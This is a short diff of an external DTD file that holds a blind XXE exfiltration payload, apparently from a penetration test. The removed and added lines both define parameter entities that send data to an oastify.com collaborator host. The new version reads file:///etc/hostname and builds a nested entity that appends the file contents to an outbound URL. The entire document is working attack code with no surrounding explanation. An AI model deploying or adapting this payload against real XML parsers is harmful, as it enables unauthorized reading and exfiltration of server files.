@@ -1,2 +1,4 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://2adnotmnsjqxaez6aqht12s8wz2qqge5.oastify.com/xxe-probe-uat/?collect=%file;'>">
-%all;
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://2adnotmnsjqxaez6aqht12s8wz2qqge5.oastify.com/?x=%file;'>">
+%eval;
+%exfil;
